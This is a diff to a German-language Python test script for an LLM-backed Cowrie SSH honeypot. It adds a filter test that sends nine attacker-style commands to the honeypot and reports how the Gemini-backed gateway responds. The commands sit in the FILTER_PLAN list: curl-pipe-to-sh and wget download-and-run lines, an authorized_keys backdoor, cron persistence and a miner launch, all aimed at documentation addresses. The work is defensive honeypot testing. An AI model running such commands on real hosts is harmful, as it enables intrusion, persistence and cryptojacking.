@@ -21,7 +21,17 @@ Antworten des Modells (method.md 9.7). Exit-Code 0 heißt alles OK.
 
 Mit ``--erwarte unavailable`` (Gateway aus) oder ``--erwarte rate_limited``
 (LLM_CALLS_PER_MINUTE=1) prüft es stattdessen, dass mindestens ein Aufruf
-diesen Ausgang hat (method.md V3). Nur Standardbibliothek.
+diesen Ausgang hat (method.md V3).
+
+Mit ``--filtertest`` (E-045) schickt es stattdessen neun eigene, harmlose
+Befehle, wie Angreifer sie schicken (Downloader, SSH-Key, Persistenz, Miner),
+nur mit Dokumentationsadressen (RFC 5737) und example.com. Ausgegeben werden
+je Befehl ein Kurzname, Ausgang, HTTP-Status, Antwortzeit, Länge und die
+ersten 200 Zeichen der Antwort (gesäubert, entschärft), dazu Zähler. Das sind
+Antworten auf unsere Befehle, kein Angreifertext; Tom sieht so, ob Gemini
+sperrt oder sich weigert. Die Befehle selbst stehen nur hier im Skript.
+
+Nur Standardbibliothek.
 """
 
 from __future__ import annotations
@@ -32,9 +42,11 @@ import hashlib
 import json
 import os
 import re
+import statistics
 import subprocess
 import sys
 import time
+import unicodedata
 from collections import Counter
 from datetime import datetime, timezone
 from pathlib import Path
@@ -42,6 +54,8 @@ from typing import Any
 
 SENSOR = Path(__file__).resolve().parents[1]
 MOTD = SENSOR / "persona" / "honeyfs" / "etc" / "motd"
+# Wrapper um sshdrive.py, der den Anfang der Ausgabe mitgibt (nur --filtertest).
+TEXT_DRIVER = SENSOR / "scripts" / "sshdrive_text.py"
 LOG_DIR = "/srv/honeypot/b/var/log/cowrie"
 LOCAL = {"127.0.0.1", "::1"}
 PORT_A = 2222
@@ -57,6 +71,23 @@ PLAN: list[dict[str, Any]] = [
 ]
 
 ANSI = re.compile(rb"\x1b\[[0-9;?]*[A-Za-z]")
+
+# --filtertest (E-045): typische Befehle von Angreifern, harmlos gemacht durch
+# die Ziele. Nur RFC-5737-Adressen und example.com, ein erfundener Public Key.
+# Neun Befehle, unter Cowries Begrenzung von 20 je Minute und Adresse.
+DUMMY_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleDummyKeyForLabProbesOnly0000000000 probe@example.com"
+FILTER_PLAN: list[tuple[str, str]] = [
+    ("uname", "uname -a"),
+    ("whoami", "whoami"),
+    ("ssh-key", f'mkdir -p ~/.ssh && echo "{DUMMY_KEY}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'),
+    ("wget", "wget http://192.0.2.10/bins/x86_64 -O /tmp/.x"),
+    ("curl-sh", "curl -fsSL https://example.com/install.sh | sh"),
+    ("laden-starten", "cd /tmp && wget -q http://198.51.100.20/a.sh && chmod +x a.sh && ./a.sh"),
+    ("chmod-start", "chmod +x /tmp/.x && /tmp/.x"),
+    ("crontab", '(crontab -l 2>/dev/null; echo "* * * * * curl -fsSL https://example.com/u.sh | sh") | crontab -'),
+    ("miner", "/tmp/.x -o stratum+tcp://pool.example.com:3333 -u example -p x --donate-level 1 -B"),
+]
+PREVIEW_CHARS = 200
 
 
 # --- nftables -----------------------------------------------------------------
@@ -277,14 +308,22 @@ def container(name: str) -> dict[str, Any]:
     return json.loads(out)
 
 
-def drive(image: str, plan: list[dict[str, Any]]) -> list[dict[str, Any]]:
+def drive(image: str, plan: list[dict[str, Any]], with_text: bool = False) -> list[dict[str, Any]]:
+    """Startet sshdrive.py aus dem Image; mit ``with_text`` den Wrapper aus
+    diesem Repo, read-only eingehängt (E-045)."""
+    mount: list[str] = []
+    script = "/cowrie/lab/sshdrive.py"
+    if with_text:
+        mount = ["-v", f"{TEXT_DRIVER}:/lab-tools/sshdrive_text.py:ro"]
+        script = "/lab-tools/sshdrive_text.py"
     out = run(
         [
             "docker", "run", "--rm", "-i", "--network", "host",
             "--read-only", "--tmpfs", "/tmp", "--cap-drop", "ALL",
             "--security-opt", "no-new-privileges", "--user", "999:999",
+            *mount,
             "--entrypoint", "/cowrie/cowrie-env/bin/python3",
-            image, "/cowrie/lab/sshdrive.py", "--host", "127.0.0.1", "--port", str(PORT_B),
+            image, script, "--host", "127.0.0.1", "--port", str(PORT_B),
         ],
         input=json.dumps(plan),
         timeout=600,
@@ -308,6 +347,105 @@ def read_events(directory: str) -> list[dict[str, Any]]:
     return events
 
 
+# --- Filtertest (E-045) ----------------------------------------------------------
+
+# Wie server/app/defang.py: URLs und IPv4-Adressen unklickbar (AGENTS.md).
+SCHEMES = {"http": "hxxp", "https": "hxxps", "ftp": "fxp", "tftp": "tfxp"}
+URL = re.compile(r"\b(?P<scheme>https?|ftp|tftp)://(?P<rest>[^\s\"'<>\\|)]*)", re.IGNORECASE)
+IPV4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+
+
+def defang(text: str) -> str:
+    def url(match: re.Match[str]) -> str:
+        authority, separator, path = match.group("rest").partition("/")
+        scheme = match.group("scheme").lower()
+        return f"{SCHEMES.get(scheme, scheme)}://{authority.replace('.', '[.]')}{separator}{path}"
+
+    text = URL.sub(url, text)
+    return IPV4.sub(lambda m: m.group(0).replace(".", "[.]"), text)
+
+
+def preview(text: str, limit: int = PREVIEW_CHARS) -> str:
+    """Die ersten ``limit`` Zeichen als eine Zeile: Zeilenumbrüche als ⏎,
+    Steuer- und Formatzeichen (auch Bidi-Steuerung) entfernt, entschärft."""
+    short = text[:limit].replace("\r\n", "\n")
+    chars = []
+    for char in short:
+        category = unicodedata.category(char)
+        if char == "\n" or category in ("Zl", "Zp"):
+            chars.append(" ⏎ ")
+        elif char == "\t":
+            chars.append(" ")
+        elif category not in ("Cc", "Cf", "Cs", "Co", "Cn"):
+            chars.append(char)
+    cleaned = defang("".join(chars))
+    return cleaned + (" …" if len(text) > limit else "")
+
+
+def filter_steps(plan: list[tuple[str, str]]) -> list[dict[str, Any]]:
+    """Je Befehl eine eigene Verbindung, wie ein Bot."""
+    return [{"name": name, "exec": [command]} for name, command in plan]
+
+
+def filter_rows(
+    sessions: dict[str, list[dict[str, Any]]], plan: list[tuple[str, str]], results: list[dict[str, Any]]
+) -> list[dict[str, Any]]:
+    """Je Befehl: Aufruf aus dem Log (über input_sha256) und Text vom Client."""
+    by_hash: dict[str, list[dict[str, Any]]] = {}
+    for events in sessions.values():
+        for event in events:
+            if event.get("eventid") == "cowrie.llm.response":
+                by_hash.setdefault(str(event.get("input_sha256")), []).append(event)
+    texts = {r.get("name"): ((r.get("kanaele") or [{}])[0]).get("text", "") for r in results}
+    rows = []
+    for name, command in plan:
+        found = by_hash.get(hashlib.sha256(command.encode("utf-8")).hexdigest(), [])
+        call = found[0] if len(found) == 1 else {}
+        rows.append(
+            {
+                "name": name,
+                "aufrufe": len(found),
+                "outcome": call.get("outcome"),
+                "http_status": call.get("http_status"),
+                "latency_ms": call.get("latency_ms"),
+                "output_chars": call.get("output_chars"),
+                "text": texts.get(name) or "",
+            }
+        )
+    return rows
+
+
+def _spread(values: list[int]) -> str:
+    return f"Median {int(statistics.median(values))}, Max {max(values)}" if values else "keine"
+
+
+def filter_report(rows: list[dict[str, Any]]) -> tuple[list[str], list[tuple[str, bool]]]:
+    """Zeilen für das Terminal und die eine Prüfung: je Befehl genau ein Aufruf."""
+    lines = [f"Filtertest: {len(rows)} eigene Befehle gegen cowrie-b (nur RFC 5737 und example.com)"]
+    for row in rows:
+        latency = row["latency_ms"] if isinstance(row["latency_ms"], int) else "-"
+        chars = row["output_chars"] if isinstance(row["output_chars"], int) else "-"
+        lines.append(
+            f"{row['name']:<14} {str(row['outcome']):<16} {str(row['http_status'] or '-'):>4} "
+            f"{latency:>6} ms {chars:>6} Zeichen | {preview(row['text'])}"
+        )
+    ok = [r for r in rows if r["outcome"] == "ok"]
+    outcomes = Counter(str(r["outcome"]) for r in rows)
+    statuses = Counter(str(r["http_status"] or "-") for r in rows)
+    lines += [
+        "Outcomes: " + ", ".join(f"{k} {v}" for k, v in sorted(outcomes.items())),
+        "HTTP: " + ", ".join(f"{k} {v}" for k, v in sorted(statuses.items())),
+        f"ok mit 0 Zeichen: {sum(1 for r in ok if r['output_chars'] == 0)}",
+        "latency_ms (ok): " + _spread([r["latency_ms"] for r in ok if isinstance(r["latency_ms"], int)]),
+        "output_chars (ok): " + _spread([r["output_chars"] for r in ok if isinstance(r["output_chars"], int)]),
+        "Hinweis: upstream_error (502) kann eine Sperre bei Gemini sein. Getrennt zählt sie auf dem",
+        "  Hauptserver: python -m app.llm_check --tage 1, unter gateway.status.upstream_blocked;",
+        "  Weigerungen unter gateway.weigerungen.",
+    ]
+    checks = [("je Befehl genau ein llm.response", bool(rows) and all(r["aufrufe"] == 1 for r in rows))]
+    return lines, checks
+
+
 def report(checks: list[tuple[str, bool]]) -> bool:
     for text, ok in checks:
         print(f"{'OK    ' if ok else 'FEHLER'} {text}")
@@ -318,6 +456,7 @@ def main(argv: list[str]) -> int:
     parser = argparse.ArgumentParser(description="Prüft cowrie-b auf dem Sensor (Schritt 7.3).")
     parser.add_argument("--erwarte", choices=["unavailable", "rate_limited"], default=None)
     parser.add_argument("--nft-json", help="nur die nftables-Prüfung, aus einer Datei (Tests)")
+    parser.add_argument("--filtertest", action="store_true", help="eigene Testbefehle, Antworten gekürzt (E-045)")
     args = parser.parse_args(argv)
 
     if args.nft_json:
@@ -327,6 +466,9 @@ def main(argv: list[str]) -> int:
     if os.geteuid() != 0:
         print("Bitte mit sudo ausführen.", file=sys.stderr)
         return 2
+
+    if args.filtertest:
+        return filtertest()
 
     checks: list[tuple[str, bool]] = []
     b = container("cowrie-b")
@@ -347,6 +489,23 @@ def main(argv: list[str]) -> int:
     log_checks, _ = check_log(sessions_since(read_events(LOG_DIR), start), PLAN, args.erwarte)
     checks += log_checks
     ok = report(checks)
+    print("Ergebnis:", "OK" if ok else "FEHLER")
+    return 0 if ok else 1
+
+
+def filtertest() -> int:
+    b = container("cowrie-b")
+    if not b["State"]["Running"]:
+        print("FEHLER cowrie-b läuft nicht")
+        return 1
+    start = datetime.now(tz=timezone.utc)
+    results = drive(b["Config"]["Image"], filter_steps(FILTER_PLAN), with_text=True)
+    time.sleep(2)
+    rows = filter_rows(sessions_since(read_events(LOG_DIR), start), FILTER_PLAN, results)
+    lines, checks = filter_report(rows)
+    print("\n".join(lines))
+    connected = all(r.get("verbunden") and r.get("fertig") for r in results) and len(results) == len(FILTER_PLAN)
+    ok = report([(f"Verbindungen: {len(results)} von {len(FILTER_PLAN)}, alle fertig", connected), *checks])
     print("Ergebnis:", "OK" if ok else "FEHLER")
     return 0 if ok else 1
 
